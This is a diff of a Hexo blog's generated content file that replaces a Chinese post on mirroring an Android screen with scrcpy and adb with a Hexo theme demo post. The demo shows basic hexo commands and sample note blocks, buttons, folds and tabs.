+<h3 id="运行服务"><a href="#运行服务" class="headerlink" title="运行服务"></a>运行服务</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
+
+<p>更多信息: <a class="link"   href="https://hexo.io/docs/server.html" >服务器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
+
+<p>更多信息: <a class="link"   href="https://hexo.io/docs/generating.html" >生成 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="部署至远程站点"><a href="#部署至远程站点" class="headerlink" title="部署至远程站点"></a>部署至远程站点</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
+
+<p>更多信息: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >部署 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="先部署在本地进行调试"><a href="#先部署在本地进行调试" class="headerlink" title="先部署在本地进行调试"></a>先部署在本地进行调试</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo s</span><br><span class="line">之后访问页面</span><br><span class="line">$ http://localhost:4000/</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="测试图片"><a href="#测试图片" class="headerlink" title="测试图片"></a>测试图片</h2><p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/image/ep/TP-scrcpy-win-down.png"
-                      alt="Scrcpy 图片"
-                ></p>
-<h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/ep/TP-scrcpy-win-down-1.png"
-                      alt="Scrcpy 图片"
-                ></p>
-<h2 id="文件中具体内容"><a href="#文件中具体内容" class="headerlink" title="文件中具体内容"></a>文件中具体内容</h2><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/ep/TP-scrcpy-win-down-2.png"
-                      alt="Scrcpy 图片"
-                ></p>
-<h2 id="如何操作内容-1"><a href="#如何操作内容-1" class="headerlink" title="如何操作内容(1)"></a>如何操作内容(1)</h2><p>通过CMD命令进入到命令行界面输入adb usb 查看是否连通相关内容<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/ep/TP-scrcpy-win-down-3.png"
-                      alt="Scrcpy 图片"
-                ></p>
-<h2 id="如何操作内容-2"><a href="#如何操作内容-2" class="headerlink" title="如何操作内容(2)"></a>如何操作内容(2)</h2><p>对内容进行链接操作<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/ep/TP-scrcpy-win-down-4.png"
-                      alt="Scrcpy 图片"
-                ></p>
-<h2 id="如何操作内容-3"><a href="#如何操作内容-3" class="headerlink" title="如何操作内容(3)"></a>如何操作内容(3)</h2><p>发现无法连接，经过排查发现是存在多个连接设备，需要使用命令 -s 明确机器识别码才能成功<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/ep/TP-scrcpy-win-down-5.png"
-                      alt="Scrcpy 图片"
-                ></p>
-<h2 id="个人最终效果"><a href="#个人最终效果" class="headerlink" title="个人最终效果"></a>个人最终效果</h2><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/image/ep/TP-scrcpy-win-down-9.png"
-                      alt="Scrcpy 图片"
-                ></p>
-<h3 id="个人推荐指数"><a href="#个人推荐指数" class="headerlink" title="个人推荐指数"></a>个人推荐指数</h3><p>推荐：⭐⭐⭐⭐  较为推荐</p>
-]]></content>
+                     data-src="/image/Hexo/Hexo.jpg"
+                      alt="Hexo 图片"
+                ><br>分辨率为3026*1892</p>
+<h2 id="笔记模块"><a href="#笔记模块" class="headerlink" title="笔记模块"></a>笔记模块</h2><h3 id="大号提示块"><a href="#大号提示块" class="headerlink" title="大号提示块"></a>大号提示块</h3><div class="note-large default"><div class="notel-title"><i class="notel-icon fa-solid fa-info"></i><p>信息</p>
+</div><div class="notel-content"><p>换行测试<br>换行测试<br>换行测试<br>blue red cyan purple orange yellow green</p>
+</div></div>
+<div class="note-large blue"><div class="notel-title"><p>提示</p>
+</div><div class="notel-content"><p>换行测试<br>换行测试<br>换行测试</p>
+</div></div>
+<div class="note-large red"><div class="notel-title"><p>自定义标题</p>
+</div><div class="notel-content"><p>换行测试<br>换行测试<br>换行测试</p>
+</div></div>
+
+<h3 id="小号提示块"><a href="#小号提示块" class="headerlink" title="小号提示块"></a>小号提示块</h3><div class="note default"><p>默认 提示块标签</p>
+</div>
+<div class="note default"><p>default 提示块标签</p>
+</div>
+<div class="note primary"><p>primary 提示块标签</p>
+</div>
+<div class="note success"><p>success 提示块标签</p>
+</div>
+<div class="note info"><p>info 提示块标签</p>
+</div>
+<div class="note warning"><p>warning 提示块标签</p>
+</div>
+<div class="note danger"><p>danger 提示块标签</p>
+</div>
+<div class="note red icon-padding"><i class="note-icon fa-solid fa-bolt"></i><p>自定义提示块标签</p>
+</div>
+
+
+<h3 id="Buttons-按钮模块"><a href="#Buttons-按钮模块" class="headerlink" title="Buttons 按钮模块"></a>Buttons 按钮模块</h3><p>不设置任何参数的 <a class="button " href='/' title='按钮'>按钮</a> 适合融入段落中。</p>
+<p>regular 按钮适合独立于段落之外：</p>
+<a class="button  regular" href='https://www.ohevan.com' title='示例博客'><i class='fa-solid fa-play-circle'></i> 示例博客</a>
+<a class="button  regular" href='https://www.ohevan.com' title='示例博客'><i class='fa-solid fa-play-circle'></i> 示例博客</a>
+<p>large 按钮更具有强调作用，建议搭配 center 使用：</p>
+<a class="button  center large" href='https://redefine-docs.ohevan.com' title='开始使用'><i class='fa-solid fa-download'></i> 开始使用</a>
+
+<h3 id="Folding-折叠模块"><a href="#Folding-折叠模块" class="headerlink" title="Folding 折叠模块"></a>Folding 折叠模块</h3><details class="blue" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>Folding 测试： 点击查看更多 </summary>
+              <div class='content'>
+              <p>啊啊啊啊啊</p><div class="note danger"><p>danger 提示块标签</p></div> <div class="note tip"><p>tip 提示块标签</p></div> 
+              </div>
+            </details>
+
+<h4 id="Folding-折叠模块-颜色列表"><a href="#Folding-折叠模块-颜色列表" class="headerlink" title="Folding 折叠模块-颜色列表"></a>Folding 折叠模块-颜色列表</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ yellow, blue, green, red, orange, pink, cyan, white, black, gray</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Tabs-分栏模块"><a href="#Tabs-分栏模块" class="headerlink" title="Tabs 分栏模块"></a>Tabs 分栏模块</h3><div class="tabs" id="tab-first-unique-name"><ul class="nav-tabs"><li class="tab active"><a class="#first-unique-name-1">First Tab</a></li><li class="tab"><a class="#first-unique-name-2">Second Tab</a></li><li class="tab"><a class="#first-unique-name-3">Third Tab</a></li></ul><div class="tab-content"><div class="tab-pane active" id="first-unique-name-1"><p><strong>This is Tab 1.</strong></p>
+<p>This is Tab 1.</p></div><div class="tab-pane" id="first-unique-name-2"><p><strong>This is Tab 2.</strong></p>
+<p>This is Tab 1.<br>This is Tab 2.</p></div><div class="tab-pane" id="first-unique-name-3"><p><strong>This is Tab 3.</strong></p>
+<p>This is Tab 1.<br>This is Tab 2.<br>This is Tab 3.</p></div></div></div>]]></content>
       <categories>
-        <category>摸鱼工具</category>
+        <category>Hexo学习内容</category>
       </categories>
       <tags>
-        <tag>工具</tag>
+        <tag>Hexo</tag>
       </tags>
   </entry>
   <entry>
